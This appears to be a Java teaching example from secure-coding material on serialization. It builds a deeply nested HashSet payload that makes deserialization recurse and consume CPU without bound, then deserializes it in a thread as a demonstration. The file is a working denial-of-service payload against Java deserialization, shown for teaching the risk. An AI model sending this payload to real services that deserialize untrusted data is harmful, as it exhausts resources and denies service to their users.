// The MIT License (MIT)
//
// Copyright (c) 2019 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package ser06j;

import ser09j.Bicycle;
import java.io.IOException;
import java.util.HashSet;
import java.util.Set;
import serial.Serial;

// java serialization DoS
public class SerialDOS {

  // Deserializing the HashSet will recurse indefinitely, consuming CPU
  static byte[] DoSpayload() throws IOException {
    Set<Object> root = new HashSet<>();
    Set<Object> s1 = root;
    Set<Object> s2 = new HashSet<>();
    for (int i = 0; i < 100; i++) {
      Set<Object> t1 = new HashSet<>();
      Set<Object> t2 = new HashSet<>();
      t1.add("foo"); // make it not equal to t2
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return Serial.serialize(root);
  }

  public static void main(String[] args) throws InterruptedException {
    // start a thread to deserialize the DoS payload
    new Thread(() -> {
      try {
        Bicycle myBike = (Bicycle) Serial.deserialize(DoSpayload());
        System.out.println(myBike.getName() + " has been deserialized.");
      } catch (ClassNotFoundException | IOException e) {
        e.printStackTrace();
      }
    }).start();

    // give the thread 10 seconds to complete
    Thread.sleep(10000);
    System.out.println("Exiting.");
    System.exit(0);
  }

}